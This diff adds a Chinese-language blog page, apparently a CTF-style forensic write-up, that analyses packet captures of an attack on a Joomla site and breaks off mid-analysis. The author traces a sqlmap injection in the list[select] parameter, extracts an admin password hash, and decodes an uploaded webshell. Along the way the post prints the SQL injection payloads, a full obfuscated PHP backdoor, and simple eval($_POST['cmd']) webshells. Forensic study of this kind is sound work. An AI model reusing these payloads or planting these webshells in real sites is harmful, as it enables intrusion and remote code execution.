@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>大流量分析-1 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">大流量分析-1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-04-18&nbsp;&nbsp;17:20:13</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h3><blockquote>
+<p>1.黑客攻击的第一个受害主机的网卡IP地址<br>2.黑客对URL的哪一个参数实施了SQL注入<br>3.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)<br>4.第一个受害主机网站数据库的名字<br>5.Joomla后台管理员的密码是多少<br>6.黑客第一次获得的php木马的密码是什么<br>7.黑客第二次上传php木马是什么时间<br>8.第二次上传的木马通过HTTP协议中的哪个头传递数据<br>9.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)<br>10.php代理第一次被使用时最先连接了哪个IP地址<br>11.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候<br>12.黑客在内网主机中添加的用户名和密码是多少<br>13.黑客从内网服务器中下载下来的文件名 </p>
+</blockquote>
+<h3 id="0x01-第一个数据包"><a href="#0x01-第一个数据包" class="headerlink" title="0x01  第一个数据包"></a>0x01  第一个数据包</h3><h4 id="1-黑客攻击的第一个受害主机的网卡IP地址"><a href="#1-黑客攻击的第一个受害主机的网卡IP地址" class="headerlink" title="1.黑客攻击的第一个受害主机的网卡IP地址"></a>1.黑客攻击的第一个受害主机的网卡IP地址</h4><p>第一个数据包是<code>jo_00001_20180207164555.pcap</code>，打开数据包，按照<code>Time</code>排序后，因为数据量实在是太大了，先尝试过滤一下<code>HTTP</code>数据包：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/1.png" alt="1"></p>
+<p>可以发现有大量的来自<code>202.1.1.2</code>的主机向<code>192.168.1.8</code>的GET请求，因此<code>192.168.1.8</code>就是受害主机。</p>
+<h4 id="2-黑客对URL的哪一个参数实施了SQL注入"><a href="#2-黑客对URL的哪一个参数实施了SQL注入" class="headerlink" title="2.黑客对URL的哪一个参数实施了SQL注入"></a>2.黑客对URL的哪一个参数实施了SQL注入</h4><p>我们随便选择一条<code>202.1.1.2 -&gt; 192.168.1.8</code>的数据包，跟踪一下tcp流看看：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/2.png" alt="2"></p>
+<p>发现<code>User-Agent</code>是<code>sqlmap</code>，显然，攻击者用<code>sqlmap</code>对主机<code>192.168.1.8</code>进行sql注入爆破，对应的请求是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?option&#x3D;com_contenthistory&amp;view&#x3D;history&amp;list[ordering]&#x3D;&amp;item_id&#x3D;1&amp;type_id&#x3D;1&amp;list[select]&#x3D;%28%27%29%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71717a7671%2C%28SELECT%20%28ELT%281188%3D1188%2C1%29%29%29%2C0x71716b6b71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--%20eSkY</span><br></pre></td></tr></table></figure>
+
+<p>url解码后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?option&#x3D;com_contenthistory&amp;view&#x3D;history&amp;list[ordering]&#x3D;&amp;item_id&#x3D;1&amp;type_id&#x3D;1&amp;list[select]&#x3D;(&#39;) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71717a7671,(SELECT (ELT(1188&#x3D;1188,1))),0x71716b6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- eSkY</span><br></pre></td></tr></table></figure>
+
+<p>黑客是对URL的<code>list[select]</code>参数进行了sql注入。</p>
+<h4 id="3-第一个受害主机网站数据库的表前缀-加上下划线-例如abc"><a href="#3-第一个受害主机网站数据库的表前缀-加上下划线-例如abc" class="headerlink" title="3.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)"></a>3.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)</h4><p>然后对于第三个问题（第一个受害主机网站数据库的表前缀），我们再随机跟踪几个tcp流就能在response中发现：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/3.png" alt="3"></p>
+<p>所以第一个受害主机<code>192.168.1.8</code>网站数据库的表前缀是<code>ajtuc_</code>。</p>
+<h4 id="4-第一个受害主机网站数据库的名字"><a href="#4-第一个受害主机网站数据库的名字" class="headerlink" title="4.第一个受害主机网站数据库的名字"></a>4.第一个受害主机网站数据库的名字</h4><p>接着需要找到<code>192.168.1.8</code>主机上的数据库的名称，但是跟了几个tcp流都没发现，所以又进行了进一步过滤，看看最后的爆破请求里面会不会有什么信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src eq 202.1.1.2 and http contains sqlmap</span><br></pre></td></tr></table></figure>
+
+<p>返回的结果全是sqlmap的请求：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/4.png" alt="4"></p>
+<p>我们查看最后面几条请求，就可以发现注入的<code>list[select]</code>字段中包含数据库名，<code>joomla</code>。</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/5.png" alt="5"></p>
+<h4 id="5-Joomla后台管理员的密码是多少"><a href="#5-Joomla后台管理员的密码是多少" class="headerlink" title="5. Joomla后台管理员的密码是多少"></a>5. Joomla后台管理员的密码是多少</h4><p>接下来要寻找joomla后台管理员的密码，进行如下过滤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src eq 202.1.1.2 and http contains password</span><br></pre></td></tr></table></figure>
+
+<p>结果返回5条信息，其中2条请求，3条get请求。我们当然先优先看一下POST请求数据：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/6.png" alt="6"></p>
+<p>第二个post请求包：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/7.png" alt="7"></p>
+<p>这两条记录的登录密码都不同，我们跟踪一下tcp流看下返回结果是什么：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/8.png" alt="8"></p>
+<p>response返回的HTML页面中有Warning：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username and password do not match or you do not have an account yet.</span><br></pre></td></tr></table></figure>
+
+<p>说明这两条记录都不是答案。</p>
+<p>然后再看一下get请求返回的结果，跟踪tcp流，发现爆出了<code>qqzvq$2y$10$lXujU7XaUviJDigqqkkq</code>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: 'qqzvq$2y$10$lXujU7XaUviJDigqqkkq' SQL=<span class="keyword">SELECT</span> (UPDATEXML(<span class="number">5928</span>,<span class="keyword">CONCAT</span>(<span class="number">0x2e</span>,<span class="number">0x71717a7671</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">22</span>) <span class="keyword">FROM</span> joomla.ajtuc_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x71716b6b71</span>),<span class="number">7096</span>)),uc.name <span class="keyword">AS</span> editor <span class="keyword">FROM</span> <span class="string">`ajtuc_ucm_history`</span> <span class="keyword">AS</span> h <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> ajtuc_users <span class="keyword">AS</span> uc <span class="keyword">ON</span> uc.id = h.editor_user_id <span class="keyword">WHERE</span> <span class="string">`h`</span>.<span class="string">`ucm_item_id`</span> = <span class="number">1</span> <span class="keyword">AND</span> <span class="string">`h`</span>.<span class="string">`ucm_type_id`</span> = <span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`h`</span>.<span class="string">`save_date`</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/9.png" alt="9"></p>
+<p>所以对这三条tcp流都进行了tcp流跟踪，发现了：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 第2条get请求</span><br><span class="line">XPATH syntax error: 'qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq' SQL=<span class="keyword">SELECT</span> (UPDATEXML(<span class="number">3613</span>,<span class="keyword">CONCAT</span>(<span class="number">0x2e</span>,<span class="number">0x71717a7671</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">23</span>,<span class="number">22</span>) <span class="keyword">FROM</span> joomla.ajtuc_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x71716b6b71</span>),<span class="number">7939</span>)),uc.name <span class="keyword">AS</span> editor <span class="keyword">FROM</span> <span class="string">`ajtuc_ucm_history`</span> <span class="keyword">AS</span> h <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> ajtuc_users <span class="keyword">AS</span> uc <span class="keyword">ON</span> uc.id = h.editor_user_id <span class="keyword">WHERE</span> <span class="string">`h`</span>.<span class="string">`ucm_item_id`</span> = <span class="number">1</span> <span class="keyword">AND</span> <span class="string">`h`</span>.<span class="string">`ucm_type_id`</span> = <span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`h`</span>.<span class="string">`save_date`</span></span><br><span class="line"></span><br><span class="line">// 第<span class="number">3</span>条<span class="keyword">get</span>请求</span><br><span class="line">XPATH syntax <span class="keyword">error</span>: <span class="string">'qqzvqzi/8B2QRD7qIlDJeqqkkq'</span> <span class="keyword">SQL</span>=<span class="keyword">SELECT</span> (UPDATEXML(<span class="number">8949</span>,<span class="keyword">CONCAT</span>(<span class="number">0x2e</span>,<span class="number">0x71717a7671</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">45</span>,<span class="number">22</span>) <span class="keyword">FROM</span> joomla.ajtuc_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x71716b6b71</span>),<span class="number">3079</span>)),uc.name <span class="keyword">AS</span> editor <span class="keyword">FROM</span> <span class="string">`ajtuc_ucm_history`</span> <span class="keyword">AS</span> h <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> ajtuc_users <span class="keyword">AS</span> uc <span class="keyword">ON</span> uc.id = h.editor_user_id <span class="keyword">WHERE</span> <span class="string">`h`</span>.<span class="string">`ucm_item_id`</span> = <span class="number">1</span> <span class="keyword">AND</span> <span class="string">`h`</span>.<span class="string">`ucm_type_id`</span> = <span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`h`</span>.<span class="string">`save_date`</span></span><br></pre></td></tr></table></figure>
+
+<p>从这三条数据中，我们可以提取出：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(0x2e,0x71717a7671,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">22</span>) <span class="keyword">FROM</span> joomla.ajtuc_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x71716b6b71</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">CONCAT</span>(<span class="number">0x2e</span>,<span class="number">0x71717a7671</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">23</span>,<span class="number">22</span>) <span class="keyword">FROM</span> joomla.ajtuc_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x71716b6b71</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">CONCAT</span>(<span class="number">0x2e</span>,<span class="number">0x71717a7671</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">45</span>,<span class="number">22</span>) <span class="keyword">FROM</span> joomla.ajtuc_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x71716b6b71</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这三条查询中都有前缀<code>0x71717a7671</code>和后缀<code>0x71716b6b71</code>，对其进行解码，获得：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x71717a7671 -&gt; qqzvq</span><br><span class="line">0x71716b6b71 -&gt; qqkkq</span><br></pre></td></tr></table></figure>
+
+<p>所以对于前面的查询结果有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">qqzvq$2y$10$lXujU7XaUviJDigqqkkq -&gt; $2y$10$lXujU7XaUviJDig</span><br><span class="line">qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq -&gt; FMzKy6.wx7EMCBqpzrJdn7</span><br><span class="line">qqzvqzi&#x2F;8B2QRD7qIlDJeqqkkq 		-&gt; zi&#x2F;8B2QRD7qIlDJe</span><br></pre></td></tr></table></figure>
+
+<p>而且前面用了sql中的<code>MID()</code>函数，该函数会从字符串中提取指定长度的字串，如<code>mid(a,b,c)</code>表示从位置b开始，截取a字符串的c位，所以需要对上面的三条结果进行拼接，得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi&#x2F;8B2QRD7qIlDJe</span><br></pre></td></tr></table></figure>
+
+<p>Joomla肯定是对用户的密码进行加密，但是对于这个密码真的不知道是如何加密的，所以只能得到加密后的密码。</p>
+<h3 id="0x02-第二个数据包"><a href="#0x02-第二个数据包" class="headerlink" title="0x02 第二个数据包"></a>0x02 第二个数据包</h3><h4 id="6-黑客第一次获得的php木马的密码是什么"><a href="#6-黑客第一次获得的php木马的密码是什么" class="headerlink" title="6. 黑客第一次获得的php木马的密码是什么"></a>6. 黑客第一次获得的php木马的密码是什么</h4><p>打开第2个数据包，先进行下过滤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src eq 202.1.1.2 and http</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/10.png" alt="10"></p>
+<p>过滤后我们就能看到四种请求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;kkkaaa.php HTTP&#x2F;1.1 </span><br><span class="line">POST &#x2F;kkkaaa.php HTTP&#x2F;1.1  (application&#x2F;x-www-form-urlencoded)</span><br><span class="line">GET &#x2F;index.php&#x2F;component&#x2F;users&#x2F; HTTP&#x2F;1.1 </span><br><span class="line">GET &#x2F;tmp&#x2F;footer.php HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+
+<p>我们跟进最可疑的第2条POST请求数据，可以看到这应该是用中国菜刀上传的：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/11.png" alt="11"></p>
+<p>所以黑客第一次获得的php木马的密码是<code>zzz</code>。</p>
+<h4 id="7-黑客第二次上传php木马是什么时间"><a href="#7-黑客第二次上传php木马是什么时间" class="headerlink" title="7. 黑客第二次上传php木马是什么时间"></a>7. 黑客第二次上传php木马是什么时间</h4><p>接着看第4条post请求，发现里面有个参数<code>z2</code>是hex数据：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/12.png" alt="12"></p>
+<p>拿去解码可以得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p=<span class="string">'l&gt;]ower";$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5'</span>;</span><br><span class="line">$d=<span class="string">']q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll("/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/",&gt;'</span>;</span><br><span class="line">$W=<span class="string">'),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base'</span>;</span><br><span class="line">$e=<span class="string">']T_LANGUAGE"];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u["&gt;]query"],$&gt;]q);$&gt;'</span>;</span><br><span class="line">$E=<span class="string">'&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt("&lt;$k&gt;$d&lt;&gt;]/$k&gt;"&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;'</span>;</span><br><span class="line">$t=<span class="string">'($i.&gt;]$kf),0,3&gt;]));$p&gt;]="";fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;'</span>;</span><br><span class="line">$M=<span class="string">']$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s="substr";$sl="s&gt;]&gt;]trto'</span>;</span><br><span class="line">$P=<span class="string">']f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]="";$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;'</span>;</span><br><span class="line">$j=str_replace(<span class="string">'fr'</span>,<span class="string">''</span>,<span class="string">'cfrrfreatfrfre_funcfrtfrion'</span>);</span><br><span class="line">$k=<span class="string">'];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]"HTTP&gt;]_REFERE&gt;]R"];$ra&gt;]=@&gt;]$r["&gt;]HTTP_A&gt;]CC&gt;]EP&gt;'</span>;</span><br><span class="line">$g=<span class="string">'"";for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;'</span>;</span><br><span class="line">$R=<span class="string">'$k&gt;]h="cb4&gt;]2";$kf="e130"&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o='</span>;</span><br><span class="line">$Q=<span class="string">']s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;'</span>;</span><br><span class="line">$v=<span class="string">']mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array("/_/","/-/"),arr&gt;]ay(&gt;]"/","+"&gt;]'</span>;</span><br><span class="line">$x=str_replace(<span class="string">'&gt;]'</span>,<span class="string">''</span>,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);</span><br><span class="line">$N=$j(<span class="string">''</span>,$x);$N();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先分析这段代码，最可疑的操作就是最后一行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$N=$j(<span class="string">''</span>,$x);</span><br><span class="line">$N();</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>$N</code>就是由<code>$j</code>和<code>$x</code>组成的。</p>
+<p>见识太少，刚看到还有点懵…搜了一些资料之后才知道这是代码混淆。可以参看这位师傅的文章：</p>
+<blockquote>
+<p> <a href="http://blog.evalbug.com/2017/09/21/phpdecode_01/" target="_blank" rel="noopener">http://blog.evalbug.com/2017/09/21/phpdecode_01/</a> </p>
+</blockquote>
+<p>代码混淆主要是为了防止被一些Web防御软件查杀，像下面这段代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面这段代码很容易就会被发现，因为包含<code>eval</code>关键字，所以有些时候时候可能会对关键字<code>eval</code>做一些处理，比如base64编码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$aaa = base64_decode(<span class="string">"ZXZhbA=="</span>);</span><br><span class="line">$$aaa($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然这只是最简单的变形，具体的可以参考其他博客：</p>
+<blockquote>
+<p> <a href="https://security.tencent.com/index.php/blog/msg/19" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/19</a> </p>
+</blockquote>
+<p>有一些代码混淆可能会比较复杂，但这个混淆还是很简单的，总体来说就是用<code>str_replace</code>实现的，对于<code>$j</code>，感觉可以直接肉眼看出<code>create_function</code>，对于<code>$x</code>，可以直接<code>var_dump</code>看一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure>
+
+<p>返回的结果是，<code>$j</code>确实是<code>create_function</code>，但是<code>$x</code>就不太清晰了：<img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/13.png" alt="13"></p>
+<p>最后出现了<code>...</code>，搜索了下原因，原来<code>var_dump</code>是安装<code>xdebug</code>之后的函数，所以解决办法就是在<code>php.ini</code>文件的<code>[xdebug]</code>节点后面追加：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xdebug.var_display_max_children=<span class="number">128</span></span><br><span class="line">xdebug.var_display_max_data=<span class="number">1024</span></span><br><span class="line">xdebug.var_display_max_depth=<span class="number">5</span></span><br></pre></td></tr></table></figure>
+
+<p>其中<code>xdebug.var_display_max_data</code>就是设置最长可以显示多少个字符，设置后重启服务器。</p>
+<p>将得到的结果格式化一下就能得到<code>$x</code>：</p>
